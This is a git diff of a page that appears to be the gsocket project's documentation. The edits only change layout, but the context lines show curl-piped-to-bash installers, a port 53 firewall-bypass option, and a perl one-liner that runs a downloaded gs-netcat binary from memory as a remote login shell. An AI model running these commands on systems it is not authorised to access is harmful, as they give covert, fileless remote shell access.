@@ -86,7 +86,7 @@ Log in to the host from your workstation
         <div class="tab">
             <input type="radio" name="css-tabs-tricks" id="curl-tricks" class="tab-switch" checked>
             <label for="curl-tricks" class="tab-label">Curl</label>
-            <div class="tab-content" style="height: 23.5rem;">
+            <div class="tab-content" style="height: 25.5rem;">
                 <ul>
                     <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
 {% highlight shell %}
@@ -102,7 +102,6 @@ X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
 {% highlight shell %}
 curl -fsSL http://nossl.segfault.net/deploy-all.sh -o deploy-all.sh && \
 bash deploy-all.sh
-
 # alternative if port 443 is firewalled:
 GS_PORT=53 bash deploy-all.sh
 {% endhighlight %}
@@ -167,7 +166,7 @@ Alternatively, start gs-netcat without the binary touching the remote file syste
         <div class="tab">
             <input type="radio" name="css-tabs-manual" id="curl-manual" class="tab-switch" checked>
             <label for="curl-manual" class="tab-label">Curl</label>
-            <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
+            <div class="tab-content" style="height: 6.5rem; padding-left: 1.2em;">
 {% highlight shell %}
 export GS_SECRET=ChangeMe GS_PORT=53; curl -SsfLk https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m) | GS_ARGS="-ilD" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"-bash"';unset GS_SECRET GS_PORT
 {% endhighlight %}
